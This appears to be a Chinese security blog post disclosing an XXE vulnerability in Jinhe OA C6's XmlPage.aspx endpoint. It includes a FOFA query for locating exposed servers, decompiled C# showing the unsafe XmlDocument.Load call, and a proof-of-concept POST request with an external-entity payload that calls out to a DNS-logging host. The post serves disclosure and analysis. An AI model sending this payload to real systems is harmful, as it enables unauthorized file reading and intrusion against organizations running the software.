---
title: "金和OA XmlPage.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-XmlPage-xxe.html
asset_dir: assets/金和oa-xmlpage.aspx-xxe漏洞
---

# 金和OA XmlPage.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/2 13:31
- 268浏览
- [0评论](#comment)
- 19分钟阅读

深入探索

漏洞预警服务

网络安全课程

物流软件安全

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `XmlPage.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `XmlPage.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Calendar.dll` 将其进行反编译后找到 **XmlPage** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.Session["UserCode"] != null)
    this.SessonUserCode = this.Session["UserCode"].ToString();
  string empty = string.Empty;
  if (this.Request.QueryString["val"] != null)
    empty = this.Request.QueryString["val"].ToString();
  string str1 = string.Empty;
  if (this.Request.QueryString["gettype"] != null)
    str1 = this.Request.QueryString["gettype"].ToLower();
  string str2 = string.Empty;
  if (this.Request.QueryString["ishave"] != null)
    str2 = this.Request.QueryString["ishave"].ToLower();
  if (this.Request.Form["year"] != null && this.Request.Form["month"] != null)
  {
    this.strYear = this.Request.Form["year"].ToString();
    this.strMonth = this.Request.Form["month"].ToString();
  }
  if (string.op_Inequality(this.strYear, ""))
    this.SearchCalendar();
  if (string.op_Inequality(empty, string.Empty))
  {
    if (string.op_Equality(empty, "con"))
    {
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load(this.Request.InputStream);
      this.SaveFile(xmlDocument.DocumentElement.SelectSingleNode("//root//SaveContent").InnerText);
      xmlDocument.RemoveAll();
    }
    else
      this.Resource(empty.Split(new char[1]{ '$' }));
  }
```

当**val=con**时，请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.calendar/XmlPage.aspx/?val=con HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA XmlPage.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
